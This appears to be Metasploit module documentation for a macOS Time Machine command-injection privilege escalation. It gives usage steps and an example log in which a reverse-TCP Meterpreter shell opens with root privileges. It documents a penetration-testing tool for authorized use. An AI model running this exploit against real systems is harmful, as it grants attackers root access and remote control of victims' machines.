## Vulnerable Application
This vulnerability works against OSX <= 10.14.3 (Mojave). It has
been tested against Mojave (10.14) and High Sierra (10.13),
however it may work on older versions.


## Verification Steps
1. Get a session on a vulnerable system
2. `use exploit/osx/local/timemachine_cmd_injection`
3. `set lhost <IP>`
4. `set lport <PORT>`
5. `set session <session_id>`
6. `run`

## Scenarios
### Example Run
```

msf5 exploit(multi/handler) > use exploit/osx/local/timemachine_cmd_injection
msf5 exploit(osx/local/timemachine_cmd_injection) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.168.0.2:5555
[*] Uploading file: '/tmp/qhjlknnmf'
[*] Executing exploit '/tmp/qhjlknnmf'
[*] Exploit result:
2019-04-18 16:18:29.190 qhjlknnmf[51122:107119] creating dmg image
2019-04-18 16:18:33.300 qhjlknnmf[51122:107119] mounting malformed disk
2019-04-18 16:18:33.564 qhjlknnmf[51122:107119] sending XPC msg
2019-04-18 16:18:33.564 qhjlknnmf[51122:107119] now wait a few minutes for the root command to run
[*] Transmitting first stager...(210 bytes)
[*] Transmitting second stager...(8192 bytes)
[*] Sending stage (808504 bytes) to 192.168.0.2
[*] Meterpreter session 2 opened (192.168.0.2:5555 -> 192.168.0.2:34270) at 2019-04-18 16:20:02 +0800

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```
